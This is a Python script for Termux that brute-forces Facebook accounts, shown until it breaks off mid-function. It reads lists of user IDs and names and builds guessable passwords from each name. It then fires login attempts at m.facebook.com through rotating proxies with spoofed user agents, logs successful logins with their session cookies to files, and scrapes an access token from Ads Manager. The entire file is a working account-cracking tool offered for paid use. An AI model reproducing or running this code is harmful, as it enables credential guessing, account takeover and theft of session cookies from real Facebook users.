#-----------SAURAV----------#

print("\033[1;37m [\u001b[36m•\033[1;37m] CHECKING FOR UPDATES \033[1;37m")

#-----------------[ IMPORT-MODULE ]-------------------#

def modules():

	os.system('pkg update -y && pkg upgrade -y')

	os.system('clear')

	try: 

		import rich

	except ModuleNotFoundError:

		print("\033[1;37m [\u001b[36m•\033[1;37m] RICH IS BEING INSTALLED \033[1;37m")

		os.system('pip install rich --quiet')

		print("\033[1;37m [\u001b[36m>>\033[1;37m] RICH HAS BEEN INSTALLED \033[1;37m")

	except:exit()

	try:

		import bs4

	except ModuleNotFoundError:

		print("\033[1;37m [\u001b[36m•\033[1;37m] BS4 IS BEING INSTALLED \033[1;37m")

		os.system('pip install bs4 --quiet')

		print("\033[1;37m [\u001b[36m>>\033[1;37m] BS4 HAS BEEN INSTALLED \033[1;37m")

	except:exit()

	try:

		import requests

	except ModuleNotFoundError:

		print("\033[1;37m [\u001b[36m•\033[1;37m] REQUESTS IS BEING INSTALLED \033[1;37m")

		os.system('pip install requests --quiet')

		print("\033[1;37m [\u001b[36m>>\033[1;37m] REQUESTS HAS BEEN INSTALLED \033[1;37m")

	except:exit()

	exit()

try:

	import requests,bs4,json,os,sys,random,datetime,time,re,multiprocessing,socket

	from bs4 import BeautifulSoup as bs

	from bs4 import BeautifulSoup

	import urllib3,rich,base64

	from rich.table import Table as me

	from rich.console import Console as sol

	from bs4 import BeautifulSoup as sop

	from concurrent.futures import ThreadPoolExecutor as tred

	from rich.console import Group as gp

	from rich.panel import Panel as nel

	from rich import print as cetak

	from rich.markdown import Markdown as mark

	from rich.columns import Columns as col

	from rich import print as prints

	from rich import pretty

	from rich.text import Text as tekz

	from time import localtime as lt

	pretty.install()

	CON=sol()

except ModuleNotFoundError:

	modules()

 #------------------[ USER-AGENT ]-------------------#

ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	pass
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
	try:
		ua=open('user-agents.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/cvandeplas/pystemon/blob/master/user-agents.txt').text
		ua=open('user-agents.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('user-agents.txt','r').read().splitlines()
#------------[ INDICATION ]---------------#

id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]

cokbrut=[]

pwpluss,pwnya=[],[]

#------------[ HEART- ]--------------#
 
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[38;5;50m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
 
###----------[ ANSII COLOR STYLE ]---------- ###
 
Z = "\x1b[0;90m"     # Hitam
M = "\x1b[38;5;196m" # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m" # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[0;95m"     # Ungu
O = "\x1b[0;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
A = "\x1b[38;5;248m" # Abu-Abu
 
###----------[ RICH COLOR STYLE ]---------- ###
 
Z2 = "[#000000]" # Hitam
M2 = "[#FF0000]" # Merah
H2 = "[#00FF00]" # Hijau
K2 = "[#FFFF00]" # Kuning
B2 = "[#00C8FF]" # Biru
U2 = "[#AF00FF]" # Ungu
N2 = "[#FF00FF]" # Pink
O2 = "[#00FFFF]" # Biru Muda
P2 = "[#FFFFFF]" # Putih
J2 = "[#FF8F00]" # Jingga
A2 = "[#AAAAAA]" # Abu-Abu
 
#--------------------[ CONVERTER-BULAN ]--------------#
 
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
CPc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
date = str(tgl)+'/'+str(bln)+'/'+str(thn)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    def saurav_don(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def SAURAVj(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
def clear():
	os.system('clear')
#------------------[ SAURAVX ]-----------------#
print("\033[1;37m [\u001b[36m•\033[1;37m] ALMOST DONE \033[1;37m")
#------------------[ MACHINE-SUPPORT ]---------------#
 
def saurav_don(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
    os.system('clear')
def back():
    login()
def contact():
    os.system('xdg-open https://www.facebook.com/sauravxx')
    back()
def linex():
    print('\033[1;37m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>')
def animation(u):
    for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
os.system('xdg-open https://www.facebook.com/sauravxx')
logo ="""
███████╗ █████╗ ██╗   ██╗██████╗  █████╗ ██╗   ██╗
██╔════╝██╔══██╗██║   ██║██╔══██╗██╔══██╗██║   ██║
███████╗███████║██║   ██║██████╔╝███████║██║   ██║
╚════██║██╔══██║██║   ██║██╔══██╗██╔══██║╚██╗ ██╔╝
███████║██║  ██║╚██████╔╝██║  ██║██║  ██║ ╚████╔╝ 
╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝  ╚═══╝      
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 AUTHOR    :\033[1;37m SAURAV DADA 
 GITHUB    :\033[1;37m SAURAV-XX
 FACEBOOK  :\033[1;37m SAURABH BHUSAL
 FEATURES  :\033[1;37m NOTHING 
 TOOL NAME :\033[1;37m SAURAV-GREEN
 STATUS    : \x1b[97m\033[37;41m PREMIUM \033[0;m
 VERSION   :  \033[1;36m3.7 \033[1;37m
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"""   
meyermarexudi =("""""")    
alltimexudi =(""" \033[32;1m[-]""")
xudartimenai =(""" \033[32;1m[+] CONTACT ADMIN PLZ ENTAR""")
fuckyoursali =(""" \033[32;1m[𝟷] 𝚈𝙾𝚄𝚁 𝚃𝙾𝙺𝙴𝙽 𝙸𝚂 𝚂𝚄𝙲𝙲𝙴𝚂𝚂𝙵𝚄𝙻𝙻𝚈 𝙰𝙿𝙿𝚁𝙾𝚅𝙴𝙳""")
xudinaministar =(""" \033[38;1m[-] Importent Note """)
hedaborakarent =(""" \033[35;1m[𝟸] 𝙵𝚄𝙲𝙺 𝙱𝚈𝙿𝙰𝚂𝙰𝚁 𝙲𝙷𝙰𝙺𝙴 𝚈𝙾𝚄𝚁 𝙳𝙰𝚃𝙰  """)
#---------------------[IP]---------------------#
frm = requests.get("http://ip-api.com/json/").json()["country"]
ct = requests.get("http://ip-api.com/json/").json()["city"]
net = requests.get("http://ip-api.com/json/").json()["isp"]
saurav = requests.get("http://ip-api.com/json/").json()["regionName"]
ip = requests.get("https://api.ipify.org").text    
                  #____APPROVAL SYSTEM ADD_____#
os.system('clear')
print(logo)
def meyexudi():
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "X".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/SAURAV-XX/SAURAV-XX/blob/main/Apvl.txt').text
    if id in httpCaht:
      msg = str(os.geteuid())
      #time.sleep(0.5)      
      pass
    else:      
      print(' [\u001b[36m•\033[1;37m] WI-FI AND DATA BOTH WORKING')
      print(' [\u001b[36m•\033[1;37m] PER KEY APPROVAL RS 50')
      print(" [\u001b[36m•\033[1;37m] YOUR KEY :\033[1;35m "+id)
      input(' \033[1;37m[\u001b[36m•\033[1;37m] IF U WANT TO BUY THEN PRESS ENTER ')
      linex()
      os.system('am start https://www.facebook.com/sauravxx'),approval() 
      time.sleep(1)
      meyexudi()
  except:
    sys.exit()
meyexudi()
#os.system("python SAURAV.py")
def naima():
	os.system('clear')
def back():
	login()
	
	
 
def login():
    try:
        token = open('.token.txt','r').read()
        cok = open('.cok.txt','r').read()
        tokenku.append(token)
        try:
            sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
            sy2 = json.loads(sy.text)['name']
            sy3 = json.loads(sy.text)['id']
            menu(sy2,sy3)
        except KeyError:
            login_lagi334()
        except requests.exceptions.ConnectionError:
            linex()
            animation(' [×] NO INTERNET CONNECTION DETECTED')
            exit()
    except IOError:
        login_lagi334()
def login_lagi334():
    try:
        token = open('.token.txt','r').read()
        cok = open('.cok.txt','r').read()
        tokenku.append(token)
        try:
            sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
            sy2 = json.loads(sy.text)['name']
            sy3 = json.loads(sy.text)['id']
            menu(sy2,sy3)
        except KeyError:
            login_lagi334()
        except requests.exceptions.ConnectionError:
            linex()
            animation(' [×] NO INTERNET CONNECTION DETECTED')
            exit()
    except IOError:
        login_lagi334()
def login_lagi334():
    try:
        os.system('clear')
        print(logo)
        ses = requests.Session()
        cookies = {'cookie':cookie}
        url = 'https://www.facebook.com/adsmanager/manage/campaigns'
        req = ses.get(url,cookies=cookies)
        set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
        nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
        roq = ses.get(nek,cookies=cookies)
        tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
        tokenw = open(".token.txt", "w").write(tok)
        cokiew = open(".cok.txt", "w").write(cookie)
      #exit()
    except Exception as e:
        os.system("rm -f .token.txt")
        os.system("rm -f .cok.txt")
        os.system("python SAURAV.py")
        exit()
        
#------------------[ NAME AND PSW ASK ]-------------------#

if not os.path.exists("data"):

    os.mkdir("data")
    
try:open("data/name.xml", "r")

except FileNotFoundError:

    open("data/name.xml", "w")

    pass
    
try:open("data/password.xml", "r")

except FileNotFoundError:
	
    open("data/password.xml", "w")
    
    pass

def namepsw():

    os.system('clear')

    print(logo)

    if os.path.exists("data/name.xml") and os.path.getsize("data/name.xml") > 0:

        with open("data/name.xml", "r") as name_file_obj:

            uname = name_file_obj.readline().strip()

    else:

        print(" [\u001b[36m•\033[1;37m] ENTER YOUR REAL NAME")

        linex()

        uname = input(" [\u001b[36m•\033[1;37m] ENTER YOUR NAME : ")

        linex()

        with open("data/name.xml", "w") as name_file_obj:

            name_file_obj.write(uname)

    if os.path.exists("data/password.xml") and os.path.getsize("data/password.xml") > 0:

        with open("data/password.xml", "r") as password_file_obj:

            upass = password_file_obj.readline().strip()

    else:

        print(" [\u001b[36m•\033[1;37m] ENTER YOUR GIRLFRND'S NAME")

        

        upass = input(" [\u001b[36m•\033[1;37m] ENTER YOUR GF NAME : ")

 

        with open("data/password.xml", "w") as password_file_obj:

            password_file_obj.write(upass)

    animation(" [\u001b[36m>\033[1;37m] YOUR DETAILS HAS BEEN CHANGED ")

    exit()

try:

    with open('data/name.xml', 'r') as name_file:

        uname = name_file.readline().strip()

    with open('data/password.xml', 'r') as password_file:

        upass = password_file.readline().strip()

    if len(uname) > 1 and len(upass) > 1:

        pass

    else:

        namepsw()

except FileNotFoundError:

    namepsw()

except IOError:

    namepsw()

#------------------[ MENU ]----------------#
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.040)
def menu():
    os.system('clear')
    print(logo)
    print("[\u001b[36m•\033[1;37m] WELCOME :\033[1;95m "+uname)
    print("\033[1;37m[\u001b[36m•\033[1;37m] TODAY'S DATE :\033[1;93m "+date)
    print("\033[1;37m[\u001b[36m•\033[1;37m] YOUR REGION :\033[1;96m "+saurav)
    print("\033[1;37m[\u001b[36m•\033[1;37m] YOUR CITY :\033[1;92m "+ct)
    print("\033[1;37m[\u001b[36m•\033[1;37m] YOUR INTERNET :\033[1;91m "+net)
    print("\033[1;37m[\u001b[36m•\033[1;37m] YOUR IP :\033[1;96m "+ip)
    linex()
    print(f"""[\u001b[36m1\033[1;37m] CRACK FILE  """)
    print(f"""[\u001b[36m2\033[1;37m] CHECK RESULTS""")
    print(f"""[\u001b[36m3\033[1;37m] CONTACT WITH ADMIN  """)
    print(f"""[\u001b[36m4\033[1;37m] CHANGE NAME""")
    print("""[\u001b[36m0\033[1;37m] EXIT""")
    linex()
    HEART = input('\033[1;37m[\u001b[36m•\033[1;37m] CHOOSE: ')
    if HEART in ['111']:
        login()
        dump_massal()
    elif HEART in ['1']:
        search_file()
    elif HEART in ['2','02']:
    	result()
    elif HEART in ['3','03']:
        os.system('xdg-open https://www.facebook.com/sauravxx')
        os.system("python SAURAV.py")
    elif HEART in ['4','04']:
        os.system('rm -rf data/name.xml')
        linex()	
        animation('[✓] NAME RESET ')
        back()
    elif HEART in ['0']:
        os.system('rm -rf .token.txt')
        os.system('rm -rf .cookie.txt')
        linex()
        animation(' [×] DONE EXIT ')       
        exit()
        os.system('cd')
        os.system('clear')
    else:
        linex()
        animation(' [×] SELECT CORRECTLY ')
        back()
 
 	#-----------------[ HASIL-CRACK ]-----------------#

def result():

	linex()

	os.system('clear')

	print(logo)

	print(' [\u001b[36m1\033[1;37m] CHECK CP IDZ ')

	print(' [\u001b[36m2\033[1;37m] CHECK OK IDZ ')

	print(' [\u001b[36m0\033[1;37m] EXIT ')

	linex()

	kz = input(' [\u001b[36m•\033[1;37m] CHOOSE : ')

	if kz in ['1','01']:

		try:vin = os.listdir('CP')

		except FileNotFoundError:

			linex()

			animation(' [\u001b[36m×\033[1;37m] FILE NOT FOUND ')

			time.sleep(3)

			back()

		if len(vin)==0:

			linex()

			animation(' [\u001b[36m•\033[1;37m] NO CP RESULTS FOUND ')

			time.sleep(2)

			back()

		else:

			cih = 0

			lol = {}

			for isi in vin:

				try:hem = open('CP/'+isi,'r').readlines()

				except:continue

				cih+=1

				if cih<10:

					nom = ''+str(cih)

					lol.update({str(cih):str(isi)})

					lol.update({nom:str(isi)})

					linex()

					print(' '+nom+'. '+isi+'\033[31m '+str(len(hem))+' \033[0m CP '+x)

				else:

					lol.update({str(cih):str(isi)})

					print(' '+str(cih)+'. '+isi+'\033[31m '+str(len(hem))+' \033[0m CP '+x)

			linex()

			geeh = input(' [\u001b[36m•\033[1;37m] CHOOSE : ')

			linex()

			try:geh = lol[geeh]

			except KeyError:

				linex()

				animation(' [\u001b[36m×\033[1;37m] NO OPTION FOUND ')

				back()

			try:lin = open('CP/'+geh,'r').read().splitlines()

			except:

				linex()

				animation(' [\u001b[36m×\033[1;37m] FILE NOT FOUND ')

				time.sleep(2)

				back()

			nocp=0

			for cpku in range(len(lin)):

				cpkuni=lin[nocp].split('|')

				print(f' [\u001b[36m•\033[1;37m] CP : \033[33m {cpkuni[0]}|{cpkuni[1]}\033[0m')

				nocp +=1

			linex()
			
			input(' >> PRESS ENTER TO BACK ')

			back()

	elif kz in ['2','02']:

		try:vin = os.listdir('OK')

		except FileNotFoundError:

			linex()

			animation(' [\u001b[36m×\033[1;37m] FILE NOT FOUND ')

			time.sleep(2)

			back()

		if len(vin)==0:

			linex()

			animation(' [\u001b[36m•\033[1;37m] NO OK RESULTS FOUND ')

			time.sleep(2)

			back()

		else:

			cih = 0

			lol = {}

			for isi in vin:

				try:hem = open('OK/'+isi,'r').readlines()

				except:continue

				cih+=1

				if cih<100:

					linex()

					nom = ''+str(cih)

					lol.update({str(cih):str(isi)})

					lol.update({nom:str(isi)})

					print(' '+nom+'. '+isi+'\033[32m '+str(len(hem))+' \033[0m OK '+x)

				else:

					lol.update({str(cih):str(isi)})

					print(' '+str(cih)+'. '+isi+'\033[32m '+str(len(hem))+' \033[0m OK '+x)

			linex()

			geeh = input(' [\u001b[36m•\033[1;37m] CHOOSE : ')

			linex()

			try:geh = lol[geeh]

			except KeyError:

				linex()

				animation(' [\u001b[36m×\033[1;37m] NO OPTION FOUND ')

				linex()

			try:lin = open('OK/'+geh,'r').read().splitlines()

			except:

				linex()

				animation(' [\u001b[36m×\033[1;37m] FILE NOT FOUND ')

				time.sleep(2)

				back()

			nocp=0

			for cpku in range(len(lin)):

				cpkuni=lin[nocp].split('|')

				print(f' [\u001b[36m•\033[1;37m] OK : \033[32m {cpkuni[0]}|{cpkuni[1]}\033[0m')

				nocp +=1
				
				linex()

			input(' >> PRESS ENTER TO BACK ')

			back()

	elif kz in ['0','00']:

		back()

	else:

		linex()

		animation(' [\u001b[36m×\033[1;37m] NO OPTION FOUND IN MENU')

		exit()
#------------------[FILE-SEARCH]----------------------#
def search_file(): 
    linex()
    print(" [\u001b[36m1\033[1;37m] AUTO FILE SEARCH")
    print(" [\u001b[36m2\033[1;37m] MANUAL FILE SRARCH")
    linex()
    xx = input(' [\u001b[36m•\033[1;37m] CHOOSE : ')
    if xx in ['1','01']: 
    	linex()
    	print(' [\u001b[36m•\033[1;37m] THIS OPTION WILL AVAILABLE SOON')
    	crack_file()
    elif xx in ['2','02']:
    	crack_file()
    else:
        crack_file()
#-------------[ CRACK-FROM-FILE ]------------------#
 
def crack_file():
    linex()
    o = input(' [\u001b[36m•\033[1;37m] FILE NAME : ')
    try:lin = open(o).read().splitlines()
    except:
        linex()
        animation(' [×] FILE NOT FOUND')
        time.sleep(2)
        back()
    for xid in lin:
        id.append(xid)
    setting()
 
#-------------[ PENGATURAN-IDZ ]---------------#
 
def setting():
    linex()
    print(' [\u001b[36m•\033[1;37m] TOTAL IDZ IN FILE :\u001b[36m '+str(len(id)))
    linex()
    print(" [\u001b[36m1\033[1;37m] ONLY OLD IDZ")
    print(" [\u001b[36m2\033[1;37m] ONLY NEW IDZ")
    print(" [\u001b[36m3\033[1;37m] BOTH MIX IDZ")
    linex()
    hu = input(' [\u001b[36m•\033[1;37m] CHOOSE : ')
    if hu in ['1','01']:
        for tua in sorted(id):
            id2.append(tua)
    elif hu in ['2','02']:
        muda=[] 
        for bacot in sorted(id):
            muda.append(bacot)
        bcm=len(muda)
        bcmi=(bcm-1)
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -=1
    elif hu in ['3','03']:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    else:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    linex()
    print(" [\u001b[36m•\033[1;37m] LOGIN METHOD ")
    linex()
    print(" [\u001b[36m1\033[1;37m] METHOD 1 (\033[1;34mBEST\033[0;97m)")
    print(" [\u001b[36m2\033[1;37m] METHOD 2")
    linex()
    hc = input(' [\u001b[36m•\033[1;37m] CHOOSE : ')
    linex()                              
    if hc in ['1','01']:
        method.append('mobile')
    elif hc in ['2','02']:
        method.append('free')
    else:
        method.append('mobile')
    passwrd()
    exit() 
 
#-------------------[ BAGIAN-WORDLIST ]------------#
 
def passwrd():
    os.system('clear')
    print(logo)
    print(' \033[1;37m[\u001b[36m•\033[1;37m] CLONING STARTED TIME : \033[1;97m'+time.strftime("%H:%M")+" "+ tag)
    print(f' [\u001b[36m•\033[1;37m] TOTAL IDS IN FILE : \u001b[36m',str(len(id)))
    linex()
    print(f' \u001b[36m>> \033[1;37m️BE PATIENCE CLONING IS STARTED')
    linex()
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
            frs = nmf.split(' ')[0]
            pwv = []
            if len(nmf)<6:
                if len(frs)<3:
                    pass
                else:                
                    pwv.append(frs+'12')
                    pwv.append(frs+'123')
                    pwv.append(frs+'1234')
                    pwv.append(frs+'12345')
                    pwv.append(nmf)
                    pwv.append(frs+'@123')
                    pwv.append(frs+'@1234')
                    pwv.append(frs+'@12345')
                    pwv.append(frs+'@@@')
                    pwv.append(frs+'@#')
                    pwv.append(frs+'123@')
                                                
            else:
                if len(frs)<3:
                    pwv.append(nmf)
                else:
                    pwv.append(frs+'12')
                    pwv.append(frs+'123')
                    pwv.append(frs+'1234')
                    pwv.append(frs+'12345')
                    pwv.append(nmf)
                    pwv.append(frs+'@123')
                    pwv.append(frs+'@1234')
                    pwv.append(frs+'@12345')
                    pwv.append(frs+'@@@')
                    pwv.append(frs+'@#')
                    pwv.append(frs+'123@')
                                        
            if 'ya' in pwpluss:
                for xpwd in pwnya:
                    pwv.append(xpwd)
            else:pass
            if 'mobile' in method:
                pool.submit(crack,idf,pwv)
            elif 'free' in method:
                pool.submit(crackfree,idf,pwv)
            elif 'touch' in method:
                pool.submit(crackfree,idf,pwv)
            elif 'mbasic' in method:
                pool.submit(crackfree,idf,pwv)
            else:
                pool.submit(crackfree,idf,pwv)
    linex()
    print('\033[97;1m[\033[92;1m+\033[97;1m] CLONING COMPLETE TIME :\033[1;97m'+time.strftime("%H:%M")+" "+ tag)
    print('\033[97;1m[\033[92;1m•\033[95;1m] OK :\033[0;91m %s '%(ok))
    print('\033[97;1m[\033[92;1m+\033[96;1m] CP :\033[0;93m %s '%(cp))
    linex()
    woi = input('\033[97;1m[\033[92;1m+\033[95;1m] \033[1;37m ENTER TO BACK')
    os.system("python SAURAV.py")
    exit() 
#--------------------[ METODE-B-API ]-----------------#
 
def crack(idf,pwv):
    global loop,ok,cp
    bo = random.choice([m,k,h,b,u,x])
    sys.stdout.write(f"\r {P}[SAURAV-XX]{P} {P}{loop}{P}/{P}{len(id)}{P} OK{P}[{H}{ok}{P}] CP{P}[\033[1;31m{cp}{P}]"),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            nip=random.choice(prox)
            proxs= {'http': 'socks5://'+nip}
            ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
            p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
            koki+=' m_pixel_ratio=2.625; wd=412x756'
            heade = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[1;31m [SAURAV-CP] {idf} │ {pw} {P}')                
                open('/sdcard/SAURAV-CP.txt', 'a').write(idf+' | '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                break              
            elif "c_user" in ses.cookies.get_dict().keys():            	
                ok+=1
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])                
                print(f'\r{P}{H} [SAURAV-OK] {idf} │ {pw} {P}  \n [\u001b[36m•\033[1;37m] COOKIE = {H}'+ kuki)                
                open('/sdcard/SAURAV-OK.txt', 'a').write(idf+' | '+pw+' | '+kuki+'\n')
                break
                
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1
 
#------------------[ METHODE-MBASIC-2 ]-------------------#
 
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r {P}[SAURAV-XX]{P} {P}{loop}{P}/{P}{len(id)}{P} OK{P}[{H}{ok}{P}] CP{P}[\033[1;31m{cp}{P}]    "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            nip=random.choice(prox)
            proxs= {'http': 'socks5://'+nip}
            ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
            p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
